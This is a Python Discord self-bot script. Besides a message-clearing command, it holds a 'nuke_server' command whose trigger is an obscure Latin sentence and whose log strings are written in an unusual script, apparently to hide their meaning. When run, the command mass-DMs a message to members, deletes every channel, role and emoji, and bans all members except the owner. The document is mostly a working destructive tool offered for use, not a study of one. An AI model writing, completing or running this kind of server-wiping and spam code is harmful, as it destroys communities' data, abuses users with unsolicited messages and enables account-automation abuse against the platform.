import discord
import asyncio
import os
from discord.ext import commands
from dotenv import load_dotenv


load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    raise ValueError("Meu bebêzinho, parece que seu arquivo .env. tá com o formato errado, vamos olhar ele?, faz o seguinte pra mim. Verifica o formato dele e corrige, ok?, vai ser algo mais ou menos assim: DISCORD_TOKEN=seu_token_aqui")


bot = commands.Bot(command_prefix="7.", self_bot=True)

@bot.event
async def on_ready():
    print(f"𐡌𐡄𐡁𐡓 𐡊 {bot.user}")

@bot.command(name="cl")
async def clear_messages(ctx):
    """𐡇𐡁𐡋 𐡌𐡋𐡕𐡊 𐡀𐡇𐡓𐡉𐡕 𐡁𐡕𐡓𐡏 𐡃𐡍𐡀."""
    def is_my_message(m):
        return m.author == bot.user

    while True:
        messages = [m async for m in ctx.channel.history(limit=100, before=ctx.message) if is_my_message(m)]
        if not messages:
            print("𐡋𐡄 𐡀𐡔𐡕𐡊𐡇𐡕 𐡌𐡋𐡕𐡊 𐡋𐡌𐡄𐡁𐡋")
            break

        try:
            if hasattr(ctx.channel, 'delete_messages'):
                await ctx.channel.delete_messages(messages)
                print(f"𐡀𐡔𐡕𐡁𐡋𐡅 {len(messages)} 𐡌𐡋𐡉𐡍 𐡁𐡇𐡁𐡅𐡓𐡀.")
            else:
                for message in messages:
                    try:
                        await message.delete()
                        print(f"𐡀𐡔𐡕𐡁𐡋𐡀 𐡌𐡋𐡀: {message.content[:20]}...")
                    except Exception as e:
                        print(f"𐡕𐡏𐡅𐡕 𐡁𐡌𐡄𐡁𐡋 𐡌𐡋𐡀 𐡉𐡇𐡃: {e}")
                        continue
        except discord.errors.NotFound:
            print("𐡌𐡋𐡀𐡀 𐡀𐡔 𐡋𐡀𐡔𐡕𐡊𐡇𐡕.")
            break
        except Exception as e:
            print(f"𐡕𐡏𐡅𐡕 𐡁𐡌𐡄𐡁𐡋: {e}")
            break

        await asyncio.sleep(1.5)

@bot.command(name="“Aurum regem devoravit; mortuus, solus, frigidus, risu adhuc fixo, nemo adfuit… sed ipse suae conditioni maluit, honorem sibi servans, rex sui, cui nihil aliud necesse est.”")
async def nuke_server(ctx, *, message: str = None):
    """𐡇𐡃𐡔 𐡌𐡌𐡋𐡊𐡕𐡀: 𐡔𐡃𐡓 𐡌𐡋𐡀 𐡋𐡊𐡋 𐡏𐡁𐡃𐡉𐡍 (𐡁𐡓 𐡌𐡍 𐡓𐡔𐡉𐡉𐡀), 𐡇𐡁𐡋 𐡕𐡓𐡏𐡍, 𐡕𐡏𐡌𐡍 𐡅𐡀𐡕𐡅𐡀𐡍, 𐡅𐡂𐡓𐡔 𐡊𐡋 𐡏𐡁𐡃𐡉𐡍 (𐡁𐡓 𐡌𐡍 𐡌𐡀𐡓𐡀 𐡅𐡔𐡋𐡉𐡊𐡄)."""
    if not ctx.guild:
        return

    print(f"𐡌𐡕𐡇𐡋 𐡋𐡇𐡃𐡔 𐡌𐡌𐡋𐡊𐡕𐡀: {ctx.guild.name}")

    
    if message:
        print("𐡔𐡃𐡓 𐡌𐡋𐡀 𐡋𐡊𐡋 𐡏𐡁𐡃𐡉𐡍...")
        for member in ctx.guild.members:
            if member.guild_permissions.administrator or member == ctx.guild.owner or member == ctx.guild.me:
                continue
            try:
                await member.send(message)
                print(f"𐡌𐡋𐡀 𐡔𐡃𐡓𐡕𐡀 𐡋: {member.name}")
                await asyncio.sleep(0.5)  
            except Exception as e:
                print(f"𐡕𐡏𐡅𐡕 𐡁𐡔𐡃𐡓 𐡌𐡋𐡀 𐡋 {member.name}: {e}")

    
    async def delete_channels():
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"𐡐𐡕𐡇 𐡌𐡄𐡁𐡋: {channel.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"𐡕𐡏𐡅𐡕 𐡁𐡌𐡄𐡁𐡋 𐡐𐡕𐡇 {channel.name}: {e}")

    
    async def delete_roles():
        for role in ctx.guild.roles:
            if role.name == "@everyone" or role.is_default() or role >= ctx.guild.me.top_role:
                continue
            try:
                await role.delete()
                print(f"𐡊𐡐𐡇 𐡌𐡄𐡁𐡋: {role.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"𐡕𐡏𐡅𐡕 𐡁𐡌𐡄𐡁𐡋 𐡊𐡐𐡇:{role.name}: {e}")

    
    async def delete_emojis():
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"𐡔𐡌𐡋 𐡌𐡄𐡁𐡋: {emoji.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"𐡕𐡏𐡅𐡕 𐡁𐡌𐡄𐡁𐡋 𐡔𐡌𐡋: {emoji.name}: {e}")

    
    async def ban_members():
        for member in ctx.guild.members:
            if member == ctx.guild.owner or member == ctx.guild.me:
                continue
            try:
                await member.ban(reason="Avaritia aeternum silentium affert.")
                print(f"𐡏𐡁𐡃 𐡂𐡓𐡔: {member.name}")
                await asyncio.sleep(1)  
            except Exception as e:
                print(f"𐡕𐡏𐡅𐡕 𐡁𐡂𐡓𐡔 𐡏𐡁𐡃 {member.name}: {e}")

    
    if message:
        await asyncio.sleep(2) 
    await delete_channels()
    await delete_roles()
    await delete_emojis()
    await ban_members()

    print("avaritia.done")

try:
    bot.run(TOKEN)
except discord.errors.LoginFailure:
    print("Aconteceu um erro aqui. Ao que parece que o seu token ou é inválido, ou ele só está no tá formato incorreto, corrige ele e volta pra mim, entäo faremos o que você quer.")
except Exception as e:
    print(f"𐡕𐡏𐡅𐡕 𐡋𐡅 𐡌𐡕𐡅𐡊𐡇𐡍: {e}")
    